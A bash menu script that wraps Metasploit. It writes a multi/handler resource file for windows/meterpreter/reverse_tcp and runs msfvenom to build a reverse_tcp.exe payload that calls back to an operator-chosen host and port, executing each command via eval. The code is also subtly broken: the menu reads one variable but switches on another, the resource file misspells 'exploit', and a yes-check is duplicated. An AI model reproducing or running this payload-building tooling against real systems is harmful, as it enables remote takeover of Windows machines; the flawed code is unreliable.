#!/bin/bash

source kp.conf

function menu_metasploit(){
	clear
	figlet Metasploit
    num1 0 " Kali-tools-top10"
    num1 5 " metasploit-framework"
    num1 10 " Normal_Boot"
    num2 10 " Create_Multi_handler" " (windows/meterpreter/reverse_tcp)"
    num3 10 " Create_Payload"
	read -n 1 -s NUM
    echo ""
    case $ANS in
    1)
        cmd_metasploit1
        ;;
    2)
        cmd_metasploit2
        ;;
	3)
		cmd_metasploit3
		;;
    *)
        ;;
    esac
}

function cmd_metasploit1(){
	clear
	figlet Metasploit
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${RED}[1]Kali-tools-top10${NC} > ${RED}[1]metasploit-framework${NC} > ${RED}[1]Normal Boot${NC}\n"
    printf "${BLUE}usage${NC} :Usage: msfconsole ${WHITE}[options]${NC}"
    printf "${BLUE}Options${NC}:\n"
    echo "  -q, --quiet                      Do not print the banner on startup"
    echo "  -r, --resource FILE              Execute the specified resource file (- for stdin)"
    echo "  -h, --help                       Show this message    "
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_metasploit2(){
	clear
	figlet Metasploit
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${RED}[1]Kali-tools-top10${NC} > ${RED}[1]metasploit-framework${NC} > ${GREEN}[2]Create Multi Handler${NC}\n"
    echo "Create handler..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    cat <<EOF >> resouce.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exsploit
EOF
    echo ""
    echo "PAYLOAD: windows/meterpreter/reverse_tcp"
    echo "LHOST  : $LHOST"
    echo "LPORT  : $LPORT"
    cmd+=" -r resouce.rc"
    echo "└─Command? > $cmd"
    read -e -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
    rm resouce.rc
}

function cmd_metasploit3(){
	clear
	figlet Metasploit
    cmd="msfvenom"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${RED}[1]Kali-tools-top10${NC} > ${RED}[1]metasploit-framework${NC} > ${YELLOW}[3]Create Payload${NC}\n"
    echo "Create Payload..."
    read -p "Local host <IP Address>: " LHOST
    read -p "Local Port: " LPORT
    echo ""
    echo "PAYLOAD  : windows/meterpreter/reverse_tcp"
    echo "LHOST    : $LHOST"
    echo "LPORT    : $LPORT"
    echo "Filetype : exe"
    cmd="$cmd -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f exe > `pwd`/reverse_tcp.exe"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}
